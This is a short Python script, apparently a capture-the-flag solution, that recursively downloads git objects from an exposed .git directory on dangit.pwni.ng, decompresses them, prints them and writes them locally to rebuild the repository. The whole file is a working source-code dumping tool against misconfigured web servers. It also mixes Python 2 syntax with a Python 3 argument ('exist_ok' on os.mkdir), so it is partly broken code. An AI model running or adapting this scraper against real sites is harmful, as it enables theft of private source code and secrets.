import requests
import re
import os

visited = set()
def visit(blob):
	if blob in visited:
		return
	visited.add(blob)
	data = requests.get('http://dangit.pwni.ng/.git/objects/' + blob[:2] + '/' + blob[2:]).content
	yeet = data.decode('zlib')
	print blob
	print yeet
	if not os.path.exists('.git/objects/' + blob[:2]):
		os.mkdir('.git/objects/' + blob[:2], exist_ok=True)
	with open('.git/objects/' + blob[:2] + '/' + blob[2:], 'wb') as f:
		f.write(data)
	for child in re.findall(r'[0-9a-f]{40}', yeet):
		visit(child)

visit('8b1559acf1b94bf02937723212a3a7417d2631c4')
